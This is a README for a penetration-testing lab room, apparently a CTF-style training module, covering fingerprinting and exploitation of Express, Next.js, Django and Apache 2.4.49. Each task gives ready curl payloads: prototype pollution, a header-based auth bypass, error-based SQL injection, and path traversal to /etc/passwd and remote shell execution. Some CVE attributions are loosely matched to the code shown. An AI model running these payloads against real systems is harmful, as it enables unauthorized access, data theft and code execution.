# ⚙️ Room 3 — Modern Web Stacks

> **Language Navigation:** [🇸🇦 النسخة العربية](./README.ar.md) | [💼 Real-World Impact & Career Guide](./real-world-impact.md) | [⬅️ Return to Root](../README.md)

---

## 🎯 Executive Summary & Mental Model

Modern web development has moved far beyond simple static HTML and monolithic LAMP stacks. Production applications now deploy distributed, component-driven, and microservice-oriented frameworks: **MERN (MongoDB, Express, React, Node.js), Next.js (React Server Components), Django (Python ORM), and specialized web servers**.

In time-boxed penetration tests and red team operations:
> **"The tester who identifies `Apache/2.4.49` or `window.__next_f` from passive HTTP response signals knows the exact CVE before their teammate has finished a port scan."**

This room establishes the rigorous **Stack Fingerprinting → Root Cause Analysis → Exploit Execution Chain** across four distinct, production-grade CVEs.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│ 1. PASSIVE FINGERPRINTING (Zero Exploit Payloads)                            │
│ Identify framework, version, and headers without triggering security alarms │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
┌──────────────────────────────────────▼──────────────────────────────────────┐
│ 2. VULNERABILITY MAPPING                                                    │
│ Map exact version signals to public CVEs and architectural root causes       │
└──────────────────────────────────────┬──────────────────────────────────────┘
                                       │
┌──────────────────────────────────────▼──────────────────────────────────────┐
│ 3. TARGETED EXPLOIT EXECUTION CHAIN                                         │
│ • Express: Prototype Pollution (Object.prototype poisoning)                 │
│ • Next.js: Header-based middleware auth bypass (CVE-2025-29927)             │
│ • Django: ORM string-formatting error-based SQLi (CVE-2021-35042)           │
│ • Apache 2.4.49: Decode-order path traversal to CGI RCE (CVE-2021-41773)    │
└─────────────────────────────────────────────────────────────────────────────┘
```

---

## 📋 Task Breakdown & Investigative Methodology

### Task 1 — Introduction (Lab Infrastructure)
* **Target Services & Ports:**
  * **Port 3000:** MERN / Express Stack
  * **Port 3001:** Next.js (React Server Components / App Router)
  * **Port 8000:** Django (Python ORM)
  * **Port 8080:** Apache 2.4.49 (Unix LAMP)

---

### Task 2 — MERN / Express Stack: Prototype Pollution (CVE-2020-8203)

#### 1. Passive Fingerprinting
* **HTTP Header:** `X-Powered-By: Express`
* **Session Cookie:** `connect.sid=s%3A...` (default for `express-session`).
* **Route Signature:** Unhandled routes return a plain-text error: `Cannot GET /invalid-path`.

#### 2. Root Cause Analysis
In JavaScript, objects inherit properties from prototype chains rooted at `Object.prototype`. When an application implements a recursive object merge or clone utility without sanitizing special keys (`__proto__` or `constructor.prototype`), user-supplied JSON can inject properties directly onto `Object.prototype`.

```javascript
// Vulnerable recursive merge implementation
function merge(target, source) {
    for (let key in source) {
        if (typeof source[key] === 'object' && source[key] !== null) {
            if (!target[key]) target[key] = {};
            merge(target[key], source[key]); // Traverses __proto__ directly to Object.prototype!
        } else {
            target[key] = source[key];
        }
    }
    return target;
}
```
* **Security Impact:** If `Object.prototype.isAdmin` is set to `true`, **every existing and newly created object in the entire Node.js runtime process inherits `isAdmin: true`**.

#### 3. Exploit Execution Chain
1. Authenticate to the application to obtain a valid session cookie:
   ```bash
   curl -i -c cookies.txt http://MACHINE_IP:3000/api/login -d "username=user&password=user"
   ```
2. Request the protected administrative endpoint:
   ```bash
   curl -b cookies.txt http://MACHINE_IP:3000/api/admin
   # Returns: 403 Forbidden / "Unauthorized"
   ```
3. Issue a prototype pollution payload to a user profile update endpoint:
   ```bash
   curl -b cookies.txt -X POST http://MACHINE_IP:3000/api/user/update \
     -H "Content-Type: application/json" \
     -d '{"__proto__": {"isAdmin": true}}'
   ```
4. Re-query the administrative endpoint using the exact same session cookie:
   ```bash
   curl -b cookies.txt http://MACHINE_IP:3000/api/admin
   ```
* **Evidence:** The server now resolves `currentUser.isAdmin` as `true` via prototype inheritance, returning the administrative flag.

---

### Task 3 — Next.js / React: Middleware Auth Bypass (CVE-2025-29927)

#### 1. Passive Fingerprinting
* **HTTP Header:** `X-Powered-By: Next.js`
* **Source Code Signature:** `window.__next_f` script tags in initial HTML. This is the definitive indicator of the Next.js **App Router** leveraging React Server Components (RSC) and the Flight serialization protocol.
* **Access Gating Behavior:** Accessing `/dashboard` unauthenticated returns an HTTP `307 Temporary Redirect` to the login page.

#### 2. Root Cause Analysis (CVSS 9.1 Critical)
Next.js middleware runs before incoming requests reach route handlers, commonly serving as the centralized gateway for authentication and authorization. To prevent infinite loops when middleware rewrites or redirects requests internally, Next.js introduced an internal communication header: `x-middleware-subrequest`.

> **The Architectural Flaw:** Next.js **never validated whether `x-middleware-subrequest` originated from an internal server subrequest or an untrusted external HTTP client**.

If an external attacker injects this header into their request, Next.js assumes the request has already been processed by middleware, **skipping middleware execution entirely**.

#### 3. Exploit Execution Chain
1. Attempt direct access to the protected `/dashboard`:
   ```bash
   curl -I http://MACHINE_IP:3001/dashboard
   # Returns: HTTP/1.1 307 Temporary Redirect (Location: /login)
   ```
2. Inject the internal bypass header formatted with the middleware module path repeated 5 times separated by colons:
   ```bash
   curl -s -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
     http://MACHINE_IP:3001/dashboard
   ```
   *(Note: If middleware is nested in `/src`, the header value is `src/middleware:src/middleware:...`).*
* **Evidence:** The authentication check in middleware is completely bypassed. The server returns HTTP `200 OK` with the full dashboard HTML and administrative flag.

---

### Task 4 — Django: SQL Injection via `order_by()` (CVE-2021-35042)

#### 1. Passive Fingerprinting
* **Server Header:** `WSGIServer/0.2 CPython/...`
* **Session Cookie:** `csrftoken=...`
* **The Near-Certain Tell:** A hidden input field named `csrfmiddlewaretoken` auto-injected into every POST form by Django's `CsrfViewMiddleware`:
  ```html
  <input type="hidden" name="csrfmiddlewaretoken" value="...">
  ```
* **Security Headers Combination:** `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: same-origin`.

#### 2. Root Cause Analysis (CVSS 9.8 Critical)
Django's Object-Relational Mapper (ORM) safely parameterizes SQL queries when used according to standard conventions. However, when developers attempt complex ordering by manually concatenating user input into raw SQL expressions, parameterized protection is broken:

```python
# Vulnerable code pattern
order = self.request.GET.get('order', 'name')
sql = (
    f"SELECT * FROM products_product "
    f"ORDER BY (CASE WHEN (1=1) THEN {order} ELSE name END)"
)
```

#### 3. Error-Based Extraction with MySQL `updatexml()`
When MySQL evaluates `updatexml(1, concat(0x7e, (SELECT ...)), 1)`, it expects valid XML syntax for the second argument. The `0x7e` character represents a tilde (`~`). Because `~` is invalid XPath syntax, MySQL generates an XPath runtime error and **includes the evaluated subquery result inside the error message**:
```
XPATH syntax error: '~database_name'
```
* **Prerequisite:** This error-based technique succeeds because Django is running with `DEBUG = True`, which renders full database traceback messages directly in HTTP 500 responses.

#### 4. Exploit Execution Chain
1. Query the vulnerable catalog endpoint with the XPath payload to extract the active database name:
   ```bash
   curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(SELECT%20database())),1)" \
     | grep -o '~[0-9a-zA-Z_][^&]*'
   ```
2. Extract the MySQL database version:
   ```bash
   curl -s "http://MACHINE_IP:8000/products/?order=updatexml(1,concat(0x7e,(SELECT%20version())),1)" \
     | grep -o '~[0-9a-zA-Z_][^&]*'
   ```
* **Evidence:** The database name and system version are reflected directly inside the extracted tilde string.

---

### Task 5 — Apache 2.4.49 (LAMP): Path Traversal to RCE (CVE-2021-41773)

#### 1. Passive Fingerprinting
* **Server Header:** `Server: Apache/2.4.49 (Unix)`.
* **CGI Check:** Requesting `/cgi-bin/` yields an HTTP `403 Forbidden` status. This confirms that the directory exists on the filesystem and `mod_cgi` is loaded.

#### 2. Root Cause Analysis (CVSS 9.8 Critical)
In Apache 2.4.49, a path-normalization bug was introduced in `ap_normalize_path()`. 
* **The Flaw:** The path traversal filter evaluated paths **before** complete URL decoding took place.
* The sequence `.%2e/` (where `%2e` is the URL-encoded dot `.`) was not recognized as `../` by the validation routine at check time.
* When the operating system subsequently resolved the path, the filesystem call decoded `%2e` to `.`, transforming `.%2e/` into `../` and escaping the document root (`/var/www/html`).

#### 3. Escalating from Traversal to Unauthenticated RCE
When `mod_cgi` is enabled on `/cgi-bin/`, traversing to an executable binary (such as `/bin/sh` or `/bin/bash`) causes Apache to treat `/bin/sh` as a CGI script. Any data sent in the HTTP POST body is piped directly into the shell's standard input (`stdin`)!

* **CRITICAL CLI REQUIREMENT:**
  Standard `curl` automatically normalizes `.%2e/` sequences into `../` before sending the request over the wire. You **must** supply `--path-as-is` to send the payload verbatim.

#### 4. Exploit Execution Chain
1. Verify arbitrary file read by reading `/etc/passwd`:
   ```bash
   curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
   ```
2. Execute remote shell commands via POST piping (adhering to CGI HTTP header output requirements):
   ```bash
   curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
     --data 'echo Content-Type: text/plain; echo; id; whoami'
   ```
3. Extract the target flag from the system root:
   ```bash
   curl -s --path-as-is "http://MACHINE_IP:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh" \
     --data 'echo Content-Type: text/plain; echo; cat /flag.txt'
   ```
* **Evidence:** Complete, unauthenticated root/daemon remote command execution and flag output.

---

### Task 6 — Automation: Nikto Web Scanner
* **Command:**
  ```bash
  nikto -h http://MACHINE_IP:8080 -nointeractive
  ```
* **Core Mental Model:**
  * Nikto excels at rapidly detecting outdated server banners (e.g., flagging `Apache/2.4.49`), known vulnerable files, and default configuration files.
  * **Nikto's Fundamental Limitation:** Automated scanners cannot understand application state or multi-step logic. Nikto will **never** discover the Prototype Pollution vulnerability in Express or the unparameterized `order_by()` injection in Django because those vulnerabilities require context-aware, state-dependent exploitation chains.

---

### Task 7 — Room Conclusion & CVE Summary Reference

| Stack | CVE ID | Vulnerability Type | CVSS v3.1 | Primary Root Cause |
|---|---|---|---|---|
| **MERN / Express** | CVE-2020-8203 | Prototype Pollution | 7.4 High | Unsanitized recursive merge modifying `Object.prototype` |
| **Next.js App Router** | CVE-2025-29927 | Middleware Auth Bypass | 9.1 Critical | Unvalidated internal header `x-middleware-subrequest` |
| **Django ORM** | CVE-2021-35042 | Error-Based SQL Injection | 9.8 Critical | Developer string concatenation inside `order_by()` clause |
| **Apache 2.4.49** | CVE-2021-41773 | Path Traversal & CGI RCE | 9.8 Critical | Decode-order flaw in `ap_normalize_path()` + `mod_cgi` |
